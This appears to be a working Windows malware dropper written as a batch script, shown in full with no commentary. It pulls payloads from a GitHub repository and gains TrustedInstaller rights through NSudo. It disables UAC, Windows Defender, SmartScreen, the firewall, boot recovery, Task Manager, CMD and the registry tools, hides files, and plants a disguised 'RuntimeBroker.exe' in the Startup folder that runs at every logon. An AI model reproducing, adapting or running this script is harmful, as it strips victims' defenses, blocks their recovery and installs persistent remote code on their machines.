cd "C:\Users\%USERNAME%\AppData\Local"
mkdir Anon && cd Anon
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/fun.jpg' -OutFile fun.jpg" && powershell start "fun.jpg"
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/NSudoLG.exe' -OutFile NSudoLG.exe"
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/ss.jpg' -OutFile ss.jpg"
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/db.bat' -OutFile db.bat"
::--------------------------------------
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\%USERNAME%\AppData\Local\Anon\ss.jpg /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
@start /b "Revision - TrustedInstaller" "NSudoLG.exe" -U:T -P:E "db.bat"
set pop=%systemroot%
Powershell -Command "sleep 2"
NSudoLG -U:T -U:T icacls "%pop%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0x0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /f /d 0 > NUl
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /f /d 0
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
::--------------------------------------
NSudoLG -U:T -ShowWindowMode:Hide sc stop windefend
NSudoLG -U:T -ShowWindowMode:Hide sc delete windefend
::--------------------------------------
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
::--------------------------------------
NSudoLG -U:T -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No
NSudoLG -U:T -ShowWindowMode:Hide bcdedit /set {default} bootstatuspolicy ignoreallfailures
::--------------------------------------
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
powershell.exe -command "Set-MpPreference -PUAProtection disable"
powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"  
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"
powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
powershell.exe -command "netsh advfirewall set allprofiles state off"
::--------------------------------------
cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/RuntimeBroker.exe' -OutFile RuntimeBroker.exe"
start RuntimeBroker.exe
::--------------------------------------
Powershell -Command "sleep 5"
taskkill /f /IM explorer.exe
start explorer.exe
exit
::--------------------------------------